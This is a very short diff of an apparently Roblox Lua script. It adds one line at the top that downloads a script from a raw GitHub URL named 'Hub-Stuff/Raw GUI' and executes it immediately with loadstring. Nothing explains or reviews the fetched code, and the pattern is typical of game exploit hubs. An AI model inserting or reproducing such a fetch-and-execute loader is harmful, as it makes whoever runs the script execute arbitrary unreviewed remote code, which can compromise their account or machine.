@@ -1,4 +1,4 @@
---
+loadstring(game:HttpGet("https://raw.githubusercontent.com/till16604-hue/Hub-Stuff/refs/heads/main/Raw%20GUI"))()
 
 do
 	local Players = game:GetService("Players")
